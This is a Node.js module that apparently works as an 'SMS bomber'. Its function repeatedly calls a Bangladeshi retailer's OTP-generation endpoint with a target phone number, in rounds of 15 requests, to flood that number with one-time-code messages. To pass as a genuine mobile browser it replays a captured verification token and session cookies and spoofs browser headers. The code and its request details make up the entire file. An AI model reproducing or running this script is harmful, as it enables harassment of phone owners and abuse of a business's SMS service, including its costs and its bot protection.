const axios = require("axios");

async function bata(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 15; i++) {
      try {
        const num = number.slice(1);
        const response = await axios.post(
  'https://www.batabd.com/apps/ez/api/GenerateOtp',
  new URLSearchParams({
    'StoreName': 'batabd.myshopify.com',
    'EmailId': 'toxiciter69@gmail.com',
    'MobileNo': num,
    'CountryCode': '880',
    'Token': '03AFcWeA48dA0CtHSmOV6ofFcj6-emf5s5PtUgcwKdTglYOOxOdqIL5HF4CtN8i2YPjkum3F1okDncXFrSqEj352Io--YhnN7T1C4MLeF9uqy@.zrMWo6G98Sso_QOLMAo2iVNtXxw9xdbIoMdB_O5pEckovpEXo3Iqrj4Xz6WpCOgwkqJx-GY7AoPeoaeVoJ0FHEogKxMbvHVVjCDtiz0zCfhCaLUh9STELjY5aEsRvNhIBObOD4_iVuG4iof-mjb51OYhjhx2u8qL5gfQgEaIGnP-jYwO4v4qxC_gyDRtyN66JjrFGAhuumu5Fwn-zHEIVg0eW-tIY-uToEg7SiyJ9sXGl8NkswSrFZkyC7GHC3QNDbYlHsMVHMRgCs_ep8P915O1rb9D0DfwOAOUtZJ2qSbKGCVsMIWVZX3ugGhuPEtxJZl882CiQjyK2zBb1jdkj-Q9FHfwxR05st7q0-zfcHeAzr6s8_WRSg53Nwnsqe4B9FiM42SwVXXzeyJP2ftNZ2D9ObpxPmNwoVeN_tfLv6Z3aFzIj8JhbxOzHkQkyQl8If36xC4Dg31Kdsyu-F20YZnWaaFPoUMuLDy6v4R1DwCnpcDcAMkJxYqxcRiBr-nQIzt975N3fUq475dx8hBH93Mi9b1ed1XGoJNiM2whuwmaMeYI0UUwF-CD8e0jN6_S9uEBHf-CfW8PmsIx5OSM_ceBrV2NQzV93e3dwGUL7USB8M4xTtPMbIo-_b47uYMLZyISwOkbZpJomF3dLvyffjJGTw605UMvFH_t8k9Uubj-mBkhmwUO7G9O_FUm6rtR0la7iQVz-KIBnLvgFFzuORkI6r9_h3bI1xvmD0sop-60Umm-TSOCq1Pqiv4gXr5shXnxqAnf1smJCOvz7egm53_HcKz8NQGFV0Lr7jRhvYnZhidRjTQcVfO9QlyFGNLb2xOr3EUTUjY__VAJuuMs_uTtv-dKxOMw',
    'IP': '103.102.136.62'
  }),
  {
    headers: {
      'authority': 'www.batabd.com',
      'accept': 'application/json, text/javascript, */*; q=0.01',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'cookie': 'localization=BD; _shopify_y=c6f3c8a4-de09-4462-891b-63c0aefb212c; _tracking_consent=3.AMPS_BDB_f_f_wsnepQT*TDO6PczemP66nA; _orig_referrer=https%3A%2F%2Fwww.google.com%2F; _landing_page=%2F%3Fsrsltid%3DAfmBOordrZ8MwsE5s29panNAqzFrJoeBNC17YfUVxX4E8FZP2q10KCUm; _fbp=fb.1.1750841794444.812915276589179059; _ga=GA1.1.1884556227.1750841796; _shopify_s=487e9fa1-adae-443c-959c-6827a2355d5a; _ga_YFN0HNH717=GS2.1.s1750841795$o1$g1$t1750841817$j38$l0$h0; _ga_2B3CNTE7Z4=GS2.1.s1750841793$o1$g1$t1750841818$j35$l0$h464124368; _ga_6FRXE1EVZT=GS2.1.s1750841795$o1$g1$t1750841819$j36$l0$h0; _gcl_au=1.1.1187242363.1750841793.1640212500.1750841837.1750841836; keep_alive=eyJ2IjoyLCJ0cyI6MTc1MDg0MTg2NTE4NywiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjo4LCJjYSI6Miwia2EiOjExLCJzYSI6MTQsInRhIjoxMywia2JhIjowLCJ0Ijo0Nywibm0iOjEsIm1zIjowLCJtaiI6MC4wOCwibXNwIjowLjA2LCJ2YyI6MSwiY3AiOjAuOCwicmMiOjAsImtqIjoxLjAxLCJraSI6OTQ5LjA0LCJzcyI6MC4xOCwic2oiOjAuMTgsInNzbSI6MC44MSwic3AiOjMsInRzIjowLjIyLCJ0aiI6MC4xNywidHAiOjMsInRzbSI6MX0sInNlcyI6eyJwIjozLCJzIjoxNzUwODQxNzkwMDE4LCJkIjo3MX19',
      'origin': 'https://www.batabd.com',
      'referer': 'https://www.batabd.com/account/register',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest'
    }
  }
);
        
        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 300000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { bata };
